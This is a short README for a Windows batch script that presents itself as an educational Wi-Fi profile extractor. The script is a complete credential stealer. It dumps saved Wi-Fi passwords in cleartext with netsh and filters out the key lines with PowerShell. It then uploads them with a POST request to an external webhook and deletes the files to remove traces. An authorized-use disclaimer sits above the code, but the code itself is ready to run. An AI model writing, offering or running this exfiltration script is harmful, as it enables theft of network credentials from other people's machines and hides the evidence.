# 🔐 Wi-Fi Profile Extractor | ⚠️ For Educational Use Only

A sleek little batch script to extract saved Wi-Fi profiles (with passwords) on Windows machines.  
Built using native Windows tools (`netsh`, PowerShell) for quick & dirty demonstrations of how *your system already knows your Wi-Fi passwords* — and so can anyone with access. 👀

> ⚠️ **Disclaimer:** This project is for **educational** and **authorized** use only.  
> ❌ **Do NOT use this script on systems you don’t own or don’t have explicit permission to test.**  
> ☠️ Unauthorized use may be illegal under local and international laws (CFAA, GDPR, etc.).

---

## 🚀 What This Script Does

1. 🔍 Dumps all saved Wi-Fi profiles and their keys in cleartext using `netsh`.
2. 🧠 Parses the XMLs to extract just the passwords (`keyMaterial`).
3. ☁️ Uploads the extracted data to your custom webhook (e.g. `Webhook.site`).
4. 🧹 Cleans up all traces (XML files + password dump).

---

## 📁 Script Breakdown

```bat
@echo off
netsh wlan export profile key=clear
timeout /t 2
powershell Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > WiFi-Key
timeout /t 2
powershell Invoke-WebRequest -Uri "https://your-webhook-url" -Method POST -InFile WiFi-Key
timeout /t 2
del Wi* /s/f/q

##Author : Yashi Singh
